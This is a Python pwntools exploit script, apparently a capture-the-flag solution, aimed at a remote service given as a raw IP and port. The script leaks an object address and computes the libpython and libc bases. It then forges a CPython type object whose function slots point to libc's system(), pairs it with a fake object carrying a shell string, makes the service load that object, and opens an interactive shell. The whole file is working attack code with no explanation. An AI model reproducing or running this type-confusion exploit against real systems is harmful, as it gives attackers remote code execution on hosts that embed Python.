#!/usr/bin/python3.11
from pwn import *

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
# context.log_level = 'debug'

gs = """
source /root/Downloads/Python-3.11.3/python-gdb.py
set disable-randomization off
#break main
break builtin_input_impl
break builtin_print_impl
break os_system
break PyObject_Str
disable
"""

io = remote("94.237.63.109", 36129)

def sp64(num: int) -> bytes:
    return ''.join(chr(b) for b in p64(num)).encode()  


# Step 1: Leak `id(0)` and calculate necessary addresses
leak = io.recvline().strip().split(b" ")[1]
py_runtime = int(leak) - 840
libpython_base = py_runtime - 0x0000000000523f40

print(f"Leaked id(0): {hex(int(leak))}")
print(f"PyRuntime: {hex(py_runtime)}")
print(f"libpython_base: {hex(libpython_base)}")

#####################################################################3
libc_base = libpython_base - 0x370000
print(f"Could we have found libc base? {hex(libc_base)}")
#####################################################################3
system = libc_base + 0x0000000000044af0 # container (libc 2.28)
print(f"I think we got system address: {hex(system)}")
#####################################################################3

# Step 2: Craft the fake type
fake_type = b""
fake_type += b"A" * 88
fake_type += sp64(system)
fake_type += b'A' * 0x28
fake_type += sp64(system)

# Send the payload and grab the stored address
io.sendline(b"0")                 
io.sendline(fake_type) 
io.recv()
inp_address_str = io.recvline().strip().split(b":")[1]
inp_address_int = int(inp_address_str)
print(f"fake_type is at: {hex(inp_address_int)} | {hex(inp_address_int+0x48)}")

# Step 3: Craft the fake object
fake_object = b"-bin/sh\x00"
fake_object += sp64(inp_address_int + 0x48)

# Send the payload and grab the stored address
io.recv()
io.sendline(b"0")
io.sendline(fake_object)
inp_address_str = io.recvline().strip().split(b":")[1]
inp_address_int2 = int(inp_address_str)
print(f"fake_object is at: {hex(inp_address_int2)} | {hex(inp_address_int2+0x48)}")

# Step 3: Trigger the payload
io.sendline(b"2")                                 # Select "Load Address"
io.sendline(str(inp_address_int2+0x48).encode())  # Load the fake object

io.interactive()